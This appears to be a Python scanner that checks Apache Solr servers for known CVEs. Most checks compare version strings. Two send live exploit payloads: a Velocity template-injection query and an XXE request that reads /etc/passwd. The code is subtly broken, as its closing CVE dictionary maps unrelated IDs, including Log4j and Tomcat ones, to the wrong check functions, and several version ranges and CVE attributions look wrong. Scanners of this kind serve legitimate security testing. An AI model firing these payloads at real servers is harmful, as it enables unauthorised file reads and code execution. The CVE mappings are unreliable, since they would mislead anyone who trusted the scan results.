import requests


def detect_solr_version(url):
    try:
        response = requests.get(f'{url}/solr/admin/info/system?wt=json')
        if response.status_code == 200 and 'lucene' in response.json():
            version = response.json()['lucene']['solr-spec-version']
            print(f"Solr version detected: {version}")
            return version
        else:
            print("Solr version not detected.")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None


# CVE-2020-9484
def check_cve_2020_9484(url):
    solr_version = detect_solr_version(url)
    if solr_version:
        major, minor, patch = [int(x) for x in solr_version.split('.')[:3]]
        return major == 8 and (
                (minor == 1 and patch <= 1) or
                (minor == 2 and patch <= 0) or
                (minor == 3 and patch <= 0)
        )
    return False


# CVE-2019-17558
def check_cve_2019_17558(url):
    solr_version = detect_solr_version(url)
    if solr_version:
        major, minor, patch = [int(x) for x in solr_version.split('.')[:3]]
        return major == 5 or (
                major == 6 and (
                (minor == 0 and patch <= 7) or
                (minor == 1 and patch <= 3) or
                (minor == 2 and patch <= 2) or
                (minor == 3 and patch <= 3) or
                (minor == 4 and patch <= 2) or
                (minor == 5 and patch <= 5) or
                (minor == 6 and patch <= 6)
        )
        )
    return False


# CVE-2019-0193
def check_cve_2019_0193(url):
    solr_version = detect_solr_version(url)
    if solr_version:
        major, minor, patch = [int(x) for x in solr_version.split('.')[:3]]
        return major == 7 and (
            (1 <= minor <= 6)
        )
    return False


# CVE-2019-0192
def check_cve_2019_0192(url):
    solr_version = detect_solr_version(url)
    if solr_version:
        major, minor, patch = [int(x) for x in solr_version.split('.')[:3]]
        return major == 7 and (
                (minor == 0 and patch <= 1) or
                (minor == 1 and patch <= 0) or
                (minor == 2 and patch <= 0) or
                (minor == 3 and patch <= 0)
        )
    return False


# CVE-2017-12630
def check_cve_2017_12630(url):
    solr_version = detect_solr_version(url)
    if solr_version:
        major, minor, patch = [int(x) for x in solr_version.split('.')[:3]]
        return major == 7 and (
                (minor == 0 and patch <= 2) or
                (minor == 1 and patch <= 0)
        )
    return False


# CVE-2017-12629
def check_cve_2017_12629(url):
    solr_query = "/select?q=1&&wt=velocity&v.template=custom&v.template.content=%24context.get(%27x%27.get(" \
                 "%27codeSource%27).getLocation())"
    target_url = f"{url.rstrip('/')}{solr_query}"

    try:
        response = requests.get(target_url, timeout=5)
        if "WEB-INF" in response.text:
            return True
        return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False


# CVE-2015-3427
def check_cve_2015_3427(url):
    solr_version = detect_solr_version(url)
    if solr_version:
        major, minor, patch = [int(x) for x in solr_version.split('.')]
        return major == 5 and (
                (minor == 0 and patch >= 0) or
                (minor == 1 and patch <= 0)
        )
    return False


# CVE-2014-3624
def check_cve_2014_3624(url):
    solr_admin_url = f"{url}/solr/#/"
    vulnerable_response_text = "Apache Solr Admin"

    try:
        response = requests.get(solr_admin_url, timeout=5)
        if response.status_code == 200 and vulnerable_response_text in response.text:
            return True
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

    return False


# CVE-2013-6397
def check_cve_2013_6397(url):
    def exploit(url0):
        try:
            query_url = f"{url0}/solr/select"
            exploit_data = {
                "q": "{!xmlparser v='<!DOCTYPE a SYSTEM \"file:///etc/passwd\"><a></a>'}"
            }
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            response = requests.post(query_url, data=exploit_data, headers=headers)

            if response.status_code == 200 and "root:x:" in response.text:
                return True
            else:
                return False
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            return False

    if exploit(url):
        return True
    else:
        return False


# 定义一个cve字典
cve_vulnerabilities = {
    'CVE-2017-5645': check_cve_2013_6397,
    'CVE-2020-9488': check_cve_2014_3624,
    'CVE-2019-17571': check_cve_2015_3427,
    'CVE-2017-12629': check_cve_2017_12629,
    'CVE-2017-12630': check_cve_2017_12630,
    'CVE-2019-0192': check_cve_2019_0192,
    'CVE-2019-0193': check_cve_2019_0193,
    'CVE-2019-17558': check_cve_2019_17558,
    'CVE-2020-9484': check_cve_2020_9484,
}
